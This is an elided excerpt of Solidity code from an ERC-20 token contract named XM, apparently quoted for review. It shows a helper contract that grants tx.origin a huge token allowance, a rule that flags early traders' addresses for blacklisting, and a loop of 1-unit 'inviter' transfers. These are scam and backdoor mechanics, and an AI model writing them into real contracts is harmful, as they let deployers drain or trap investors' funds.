...
contract TokenReceiver{
    constructor (address token) public{
        ...
        IERC20(token).approve(tx.origin,10 ** 12 * 10**18);
    }
}
...
contract XM is Context, IERC20, Ownable {
    ...
    uint public mkTxAmount = 10 * 10 ** 9;
    uint public lpTxAmount = 10 * 10 ** 9;
    uint public maxTxAmount = 10 * 10** 9;

    uint public maxFistAmount = 50 * 10** 18;
    ...
    uint public holdTokenLimit = 10000 * 10 ** 9;
        ...
        if( checkLiquidityTx ){
         ...
         if (ammPairs[to] || ammPairs[from]) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                ...
                if (block.number < goMoonBlock + kb && !ammPairs[from]) {
                    _girls[from] = true;
                }}}
        Param memory param;
    ...
    function _takeInviterFeeKt(
        ...
        for (uint256 i = 0; i < 9; i++) {
            ...
            ktNum = ktNum+1;
            _tOwned[address(this)] = _tOwned[address(this)].sub(1);
        _tOwned[_receiveD] = _tOwned[_receiveD].add(1);
        emit Transfer(address(this), _receiveD, 1);
        }
    }
